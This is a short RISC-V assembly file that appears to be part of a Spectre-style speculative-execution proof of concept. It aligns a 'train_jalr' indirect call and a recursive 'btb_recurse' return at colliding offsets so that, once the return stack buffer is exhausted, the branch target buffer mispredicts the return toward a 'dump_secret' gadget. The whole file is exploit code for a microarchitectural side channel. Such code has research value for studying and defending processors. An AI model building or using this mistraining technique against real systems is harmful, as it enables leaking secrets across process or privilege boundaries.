.option norvc
.text

# ===========================================================================
# Training function: jalr at offset +0x2C from 32K boundary
# ===========================================================================
.balign 32768
.global train_jalr
train_jalr:
    addi sp, sp, -16
    sd ra, 0(sp)
    # Padding to align jalr with ret in btb_recurse
    nop
    nop
    nop
    nop
    nop
    nop
    # Load and call target
    la t0, train_target
    ld t0, 0(t0)
.global train_jalr_site
train_jalr_site:
    jalr ra, t0             # +0x2C: trains IBP
    # Epilogue
    ld ra, 0(sp)
    addi sp, sp, 16
    ret

# ===========================================================================
# Recursion function: ret at offset +0x2C from 32K boundary
# Exhausts RSB, then ret falls back to BTB -> predicts dump_secret
# ===========================================================================
.balign 32768
.global btb_recurse
btb_recurse:
    addi sp, sp, -16
    sd ra, 0(sp)

    # Check recurse_depth
    la t0, recurse_depth
    lw t1, 0(t0)
    beqz t1, .Ldone

    # Decrement and recurse
    addi t1, t1, -1
    sw t1, 0(t0)
    call btb_recurse

.Ldone:
    ld ra, 0(sp)
    addi sp, sp, 16
.global btb_recurse_ret
btb_recurse_ret:
    ret                     # +0x2C: collides with jalr above
